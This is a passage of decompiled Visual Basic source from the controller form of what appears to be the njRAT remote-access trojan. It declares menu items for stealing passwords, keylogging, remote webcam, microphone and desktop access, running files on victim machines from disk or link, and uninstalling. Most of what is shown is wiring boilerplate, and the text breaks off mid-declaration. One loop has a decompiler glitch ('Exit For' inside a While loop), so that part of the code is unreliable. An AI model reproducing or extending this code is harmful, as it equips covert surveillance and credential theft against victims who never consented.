Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My
Imports NJRAT.My.Resources
Imports NJRAT.njRAT
Imports WinMM

Namespace NJRAT
	' Token: 0x0200000E RID: 14
	<DesignerGenerated()>
	Public Partial Class Form1
		Inherits Form

		' Token: 0x060001C5 RID: 453 RVA: 0x000117D4 File Offset: 0x0000F9D4
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Form1.__ENCList
			SyncLock _ENCList
				If Form1.__ENCList.Count = Form1.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Form1.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Form1.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Form1.__ENCList(num) = Form1.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Form1.__ENCList.RemoveRange(num, Form1.__ENCList.Count - num)
					Form1.__ENCList.Capacity = Form1.__ENCList.Count
				End If
				Form1.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x170000AA RID: 170
		' (get) Token: 0x060001C8 RID: 456 RVA: 0x00016210 File Offset: 0x00014410
		' (set) Token: 0x060001C9 RID: 457 RVA: 0x000025DA File Offset: 0x000007DA
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip1 = value
			End Set
		End Property

		' Token: 0x170000AB RID: 171
		' (get) Token: 0x060001CA RID: 458 RVA: 0x00016228 File Offset: 0x00014428
		' (set) Token: 0x060001CB RID: 459 RVA: 0x00016240 File Offset: 0x00014440
		Friend Overridable Property ManagerToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ManagerToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ManagerToolStripMenuItem_Click
				If Me._ManagerToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._ManagerToolStripMenuItem.Click, value2
				End If
				Me._ManagerToolStripMenuItem = value
				If Me._ManagerToolStripMenuItem IsNot Nothing Then
					AddHandler Me._ManagerToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000AC RID: 172
		' (get) Token: 0x060001CC RID: 460 RVA: 0x00016298 File Offset: 0x00014498
		' (set) Token: 0x060001CD RID: 461 RVA: 0x000025E3 File Offset: 0x000007E3
		Friend Overridable Property RunFileToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RunFileToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Me._RunFileToolStripMenuItem = value
			End Set
		End Property

		' Token: 0x170000AD RID: 173
		' (get) Token: 0x060001CE RID: 462 RVA: 0x000162B0 File Offset: 0x000144B0
		' (set) Token: 0x060001CF RID: 463 RVA: 0x000162C8 File Offset: 0x000144C8
		Friend Overridable Property FromLinkToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._FromLinkToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FromLinkToolStripMenuItem_Click
				If Me._FromLinkToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._FromLinkToolStripMenuItem.Click, value2
				End If
				Me._FromLinkToolStripMenuItem = value
				If Me._FromLinkToolStripMenuItem IsNot Nothing Then
					AddHandler Me._FromLinkToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000AE RID: 174
		' (get) Token: 0x060001D0 RID: 464 RVA: 0x00016320 File Offset: 0x00014520
		' (set) Token: 0x060001D1 RID: 465 RVA: 0x00016338 File Offset: 0x00014538
		Friend Overridable Property FromDiskToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._FromDiskToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FromDiskToolStripMenuItem_Click
				If Me._FromDiskToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._FromDiskToolStripMenuItem.Click, value2
				End If
				Me._FromDiskToolStripMenuItem = value
				If Me._FromDiskToolStripMenuItem IsNot Nothing Then
					AddHandler Me._FromDiskToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000AF RID: 175
		' (get) Token: 0x060001D2 RID: 466 RVA: 0x00016390 File Offset: 0x00014590
		' (set) Token: 0x060001D3 RID: 467 RVA: 0x000163A8 File Offset: 0x000145A8
		Friend Overridable Property ScriptToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ScriptToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ScriptToolStripMenuItem_Click
				If Me._ScriptToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._ScriptToolStripMenuItem.Click, value2
				End If
				Me._ScriptToolStripMenuItem = value
				If Me._ScriptToolStripMenuItem IsNot Nothing Then
					AddHandler Me._ScriptToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B0 RID: 176
		' (get) Token: 0x060001D4 RID: 468 RVA: 0x00016400 File Offset: 0x00014600
		' (set) Token: 0x060001D5 RID: 469 RVA: 0x00016418 File Offset: 0x00014618
		Friend Overridable Property RemoteDesktopToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RemoteDesktopToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RemoteDesktopToolStripMenuItem_Click
				If Me._RemoteDesktopToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RemoteDesktopToolStripMenuItem.Click, value2
				End If
				Me._RemoteDesktopToolStripMenuItem = value
				If Me._RemoteDesktopToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RemoteDesktopToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B1 RID: 177
		' (get) Token: 0x060001D6 RID: 470 RVA: 0x00016470 File Offset: 0x00014670
		' (set) Token: 0x060001D7 RID: 471 RVA: 0x00016488 File Offset: 0x00014688
		Friend Overridable Property RemoteCamToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RemoteCamToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RemoteCamToolStripMenuItem_Click
				If Me._RemoteCamToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RemoteCamToolStripMenuItem.Click, value2
				End If
				Me._RemoteCamToolStripMenuItem = value
				If Me._RemoteCamToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RemoteCamToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B2 RID: 178
		' (get) Token: 0x060001D8 RID: 472 RVA: 0x000164E0 File Offset: 0x000146E0
		' (set) Token: 0x060001D9 RID: 473 RVA: 0x000164F8 File Offset: 0x000146F8
		Friend Overridable Property MicrophoneToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._MicrophoneToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.MicrophoneToolStripMenuItem_Click
				If Me._MicrophoneToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._MicrophoneToolStripMenuItem.Click, value2
				End If
				Me._MicrophoneToolStripMenuItem = value
				If Me._MicrophoneToolStripMenuItem IsNot Nothing Then
					AddHandler Me._MicrophoneToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B3 RID: 179
		' (get) Token: 0x060001DA RID: 474 RVA: 0x00016550 File Offset: 0x00014750
		' (set) Token: 0x060001DB RID: 475 RVA: 0x00016568 File Offset: 0x00014768
		Friend Overridable Property GetPasswordsToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._GetPasswordsToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.GetPasswordsToolStripMenuItem_Click
				If Me._GetPasswordsToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._GetPasswordsToolStripMenuItem.Click, value2
				End If
				Me._GetPasswordsToolStripMenuItem = value
				If Me._GetPasswordsToolStripMenuItem IsNot Nothing Then
					AddHandler Me._GetPasswordsToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B4 RID: 180
		' (get) Token: 0x060001DC RID: 476 RVA: 0x000165C0 File Offset: 0x000147C0
		' (set) Token: 0x060001DD RID: 477 RVA: 0x000165D8 File Offset: 0x000147D8
		Friend Overridable Property KeyloggerToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._KeyloggerToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KeyloggerToolStripMenuItem_Click
				If Me._KeyloggerToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._KeyloggerToolStripMenuItem.Click, value2
				End If
				Me._KeyloggerToolStripMenuItem = value
				If Me._KeyloggerToolStripMenuItem IsNot Nothing Then
					AddHandler Me._KeyloggerToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B5 RID: 181
		' (get) Token: 0x060001DE RID: 478 RVA: 0x00016630 File Offset: 0x00014830
		' (set) Token: 0x060001DF RID: 479 RVA: 0x00016648 File Offset: 0x00014848
		Friend Overridable Property OpenChatToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._OpenChatToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OpenChatToolStripMenuItem_Click
				If Me._OpenChatToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._OpenChatToolStripMenuItem.Click, value2
				End If
				Me._OpenChatToolStripMenuItem = value
				If Me._OpenChatToolStripMenuItem IsNot Nothing Then
					AddHandler Me._OpenChatToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B6 RID: 182
		' (get) Token: 0x060001E0 RID: 480 RVA: 0x000166A0 File Offset: 0x000148A0
		' (set) Token: 0x060001E1 RID: 481 RVA: 0x000025EC File Offset: 0x000007EC
		Friend Overridable Property ServerToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ServerToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Me._ServerToolStripMenuItem = value
			End Set
		End Property

		' Token: 0x170000B7 RID: 183
		' (get) Token: 0x060001E2 RID: 482 RVA: 0x000166B8 File Offset: 0x000148B8
		' (set) Token: 0x060001E3 RID: 483 RVA: 0x000025F5 File Offset: 0x000007F5
		Friend Overridable Property UpdateToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._UpdateToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Me._UpdateToolStripMenuItem = value
			End Set
		End Property

		' Token: 0x170000B8 RID: 184
		' (get) Token: 0x060001E4 RID: 484 RVA: 0x000166D0 File Offset: 0x000148D0
		' (set) Token: 0x060001E5 RID: 485 RVA: 0x000166E8 File Offset: 0x000148E8
		Friend Overridable Property FromDISKToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._FromDISKToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FromDISKToolStripMenuItem1_Click
				If Me._FromDISKToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._FromDISKToolStripMenuItem1.Click, value2
				End If
				Me._FromDISKToolStripMenuItem1 = value
				If Me._FromDISKToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._FromDISKToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B9 RID: 185
		' (get) Token: 0x060001E6 RID: 486 RVA: 0x00016740 File Offset: 0x00014940
		' (set) Token: 0x060001E7 RID: 487 RVA: 0x00016758 File Offset: 0x00014958
		Friend Overridable Property FromLINKToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._FromLINKToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FromLINKToolStripMenuItem1_Click
				If Me._FromLINKToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._FromLINKToolStripMenuItem1.Click, value2
				End If
				Me._FromLINKToolStripMenuItem1 = value
				If Me._FromLINKToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._FromLINKToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000BA RID: 186
		' (get) Token: 0x060001E8 RID: 488 RVA: 0x000167B0 File Offset: 0x000149B0
		' (set) Token: 0x060001E9 RID: 489 RVA: 0x000167C8 File Offset: 0x000149C8
		Friend Overridable Property UninstallToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._UninstallToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UninstallToolStripMenuItem_Click
				If Me._UninstallToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._UninstallToolStripMenuItem.Click, value2
				End If
				Me._UninstallToolStripMenuItem = value
				If Me._UninstallToolStripMenuItem IsNot Nothing Then
					AddHandler Me._UninstallToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000BB RID: 187
		' (get) Token: 0x060001EA RID: 490 RVA: 0x00016820 File Offset: 0x00014A20
		' (set) Token: 0x060001EB RID: 491 RVA: 0x00016838 File Offset: 0x00014A38
		Friend Overridable Property RestartToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RestartToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RestartToolStripMenuItem_Click
				If Me._RestartToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RestartToolStripMenuItem.Click, value2
				End If
				Me._RestartToolStripMenuItem = value
				If Me._RestartToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RestartToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000BC RID: 188
		' (get) Token: 0x060001EC RID: 492 RVA: 0x00016890 File Offset: 0x00014A90
		' (set) Token: 0x060001ED RID: 493 RVA: 0x000168A8 File Offset: 0x00014AA8
		Friend Overridable Property CloseToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CloseToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CloseToolStripMenuItem_Click
				If Me._CloseToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CloseToolStripMenuItem.Click, value2
				End If
				Me._CloseToolStripMenuItem = value
				If Me._CloseToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CloseToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000BD RID: 189
		' (get) Token: 0x060001EE RID: 494 RVA: 0x00016900 File Offset: 0x00014B00
		' (set) Token: 0x060001EF RID: 495 RVA: 0x00016918 File Offset: 0x00014B18
		Friend Overridable Property DisconnectToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._DisconnectToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DisconnectToolStripMenuItem_Click
				If Me._DisconnectToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._DisconnectToolStripMenuItem.Click, value2
				End If
				Me._DisconnectToolStripMenuItem = value
				If Me._DisconnectToolStripMenuItem IsNot Nothing Then
					AddHandler Me._DisconnectToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000BE RID: 190
		' (get) Token: 0x060001F0 RID: 496 RVA: 0x00016970 File Offset: 0x00014B70
		' (set) Token: 0x060001F1 RID: 497 RVA: 0x00016988 File Offset: 0x00014B88
		Friend Overridable Property RenameToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RenameToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RenameToolStripMenuItem_Click
				If Me._RenameToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RenameToolStripMenuItem.Click, value2
				End If
				Me._RenameToolStripMenuItem = value
				If Me._RenameToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RenameToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000BF RID: 191
		' (get) Token: 0x060001F2 RID: 498 RVA: 0x000169E0 File Offset: 0x00014BE0
		' (set) Token: 0x060001F3 RID: 499 RVA: 0x000169F8 File Offset: 0x00014BF8
		Friend Overridable Property OpenFolderToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._OpenFolderToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OpenFolderToolStripMenuItem_Click
				If Me._OpenFolderToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._OpenFolderToolStripMenuItem.Click, value2
				End If
				Me._OpenFolderToolStripMenuItem = value
				If Me._OpenFolderToolStripMenuItem IsNot Nothing Then
					AddHandler Me._OpenFolderToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000C0 RID: 192
		' (get) Token: 0x060001F4 RID: 500 RVA: 0x00016A50 File Offset: 0x00014C50
		' (set) Token: 0x060001F5 RID: 501 RVA: 0x000025FE File Offset: 0x000007FE
		Friend Overridable Property IMG2 As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._IMG2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._IMG2 = value
			End Set
		End Property

		' Token: 0x170000C1 RID: 193
		' (get) Token: 0x060001F6 RID: 502 RVA: 0x00016A68 File Offset: 0x00014C68
		' (set) Token: 0x060001F7 RID: 503 RVA: 0x00016A80 File Offset: 0x00014C80
		Friend Overridable Property NotifyIcon1 As NotifyIcon
			<DebuggerNonUserCode()>
			Get
				Return Me._NotifyIcon1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NotifyIcon)
				Dim value2 As MouseEventHandler = AddressOf Me.NotifyIcon1_MouseDoubleClick
				If Me._NotifyIcon1 IsNot Nothing Then
					RemoveHandler Me._NotifyIcon1.MouseDoubleClick, value2
				End If
				Me._NotifyIcon1 = value
				If Me._NotifyIcon1 IsNot Nothing Then
					AddHandler Me._NotifyIcon1.MouseDoubleClick, value2
				End If
			End Set
		End Property

		' Token: 0x170000C2 RID: 194
		' (get) Token: 0x060001F8 RID: 504 RVA: 0x00016AD8 File Offset: 0x00014CD8
		' (set) Token: 0x060001F9 RID: 505 RVA: 0x00002607 File Offset: 0x00000807
		Friend Overridable Property ContextMenuStrip2 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip2 = value
			End Set
		End Property

		' Token: 0x170000C3 RID: 195
		' (get) Token: 0x060001FA RID: 506 RVA: 0x00016AF0 File Offset: 0x00014CF0
		' (set) Token: 0x060001FB RID: 507 RVA: 0x00016B08 File Offset: 0x00014D08
		Friend Overridable Property ShowToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ShowToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ShowToolStripMenuItem_Click
				If Me._ShowToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._ShowToolStripMenuItem.Click, value2
				End If
				Me._ShowToolStripMenuItem = value
				If Me._ShowToolStripMenuItem IsNot Nothing Then
					AddHandler Me._ShowToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000C4 RID: 196
		' (get) Token: 0x060001FC RID: 508 RVA: 0x00016B60 File Offset: 0x00014D60
		' (set) Token: 0x060001FD RID: 509 RVA: 0x00016B78 File Offset: 0x00014D78
		Friend Overridable Property RestartToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RestartToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RestartToolStripMenuItem1_Click
				If Me._RestartToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._RestartToolStripMenuItem1.Click, value2
				End If
				Me._RestartToolStripMenuItem1 = value
				If Me._RestartToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._RestartToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000C5 RID: 197
		' (get) Token: 0x060001FE RID: 510 RVA: 0x00016BD0 File Offset: 0x00014DD0
		' (set) Token: 0x060001FF RID: 511 RVA: 0x00016BE8 File Offset: 0x00014DE8
		Friend Overridable Property ExitToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ExitToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ExitToolStripMenuItem_Click
				If Me._ExitToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._ExitToolStripMenuItem.Click, value2
				End If
				Me._ExitToolStripMenuItem = value
				If Me._ExitToolStripMenuItem IsNot Nothing Then
					AddHandler Me._ExitToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000C6 RID: 198
		' (get) Token: 0x06000200 RID: 512 RVA: 0x00016C40 File Offset: 0x00014E40
		' (set) Token: 0x06000201 RID: 513 RVA: 0x00016C58 File Offset: 0x00014E58
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._Timer1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				If Me._Timer1 IsNot Nothing Then
					RemoveHandler Me._Timer1.Tick, value2
				End If
				Me._Timer1 = value
				If Me._Timer1 IsNot Nothing Then
					AddHandler Me._Timer1.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170000C7 RID: 199
		' (get) Token: 0x06000202 RID: 514 RVA: 0x00016CB0 File Offset: 0x00014EB0
		' (set) Token: 0x06000203 RID: 515 RVA: 0x00002610 File Offset: 0x00000810
		Friend Overridable Property FormSkin1 As FormSkin
			<DebuggerNonUserCode()>
			Get
				Return Me._FormSkin1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FormSkin)
				Me._FormSkin1 = value
			End Set
		End Property

		' Token: 0x170000C8 RID: 200
		' (get) Token: 0x06000204 RID: 516 RVA: 0x00016CC8 File Offset: 0x00014EC8
		' (set) Token: 0x06000205 RID: 517 RVA: 0x00002619 File Offset: 0x00000819
		Friend Overridable Property StatusStrip1 As StatusStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._StatusStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As StatusStrip)
				Me._StatusStrip1 = value
			End Set
		End Property

		' Token: 0x170000C9 RID: 201
		' (get) Token: 0x06000206 RID: 518 RVA: 0x00016CE0 File Offset: 0x00014EE0
		' (set) Token: 0x06000207 RID: 519 RVA: 0x00002622 File Offset: 0x00000822
		Friend Overridable Property ToolStripStatusLabel1 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Me._ToolStripStatusLabel1 = value
			End Set
		End Property

		' Token: 0x170000CA RID: 202
		' (get) Token: 0x06000208 RID: 520 RVA: 0x00016CF8 File Offset: 0x00014EF8
		' (set) Token: 0x06000209 RID: 521 RVA: 0x0000262B File Offset: 0x0000082B
		Friend Overridable Property ToolStripStatusLabel3 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Me._ToolStripStatusLabel3 = value
			End Set
		End Property

		' Token: 0x170000CB RID: 203
		' (get) Token: 0x0600020A RID: 522 RVA: 0x00016D10 File Offset: 0x00014F10
		' (set) Token: 0x0600020B RID: 523 RVA: 0x00002634 File Offset: 0x00000834
		Friend Overridable Property ToolStripStatusLabel5 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Me._ToolStripStatusLabel5 = value
			End Set
		End Property

		' Token: 0x170000CC RID: 204
		' (get) Token: 0x0600020C RID: 524 RVA: 0x00016D28 File Offset: 0x00014F28
		' (set) Token: 0x0600020D RID: 525 RVA: 0x0000263D File Offset: 0x0000083D
		Friend Overridable Property ToolStripStatusLabel2 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Me._ToolStripStatusLabel2 = value
			End Set
		End Property

		' Token: 0x170000CD RID: 205
		' (get) Token: 0x0600020E RID: 526 RVA: 0x00016D40 File Offset: 0x00014F40
		' (set) Token: 0x0600020F RID: 527 RVA: 0x00002646 File Offset: 0x00000846
		Friend Overridable Property ToolStripStatusLabel8 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel8
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Me._ToolStripStatusLabel8 = value
			End Set
		End Property

		' Token: 0x170000CE RID: 206
		' (get) Token: 0x06000210 RID: 528 RVA: 0x00016D58 File Offset: 0x00014F58
		' (set) Token: 0x06000211 RID: 529 RVA: 0x0000264F File Offset: 0x0000084F
		Friend Overridable Property ToolStripStatusLabel4 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Me._ToolStripStatusLabel4 = value
			End Set
		End Property

		' Token: 0x170000CF RID: 207
		' (get) Token: 0x06000212 RID: 530 RVA: 0x00016D70 File Offset: 0x00014F70
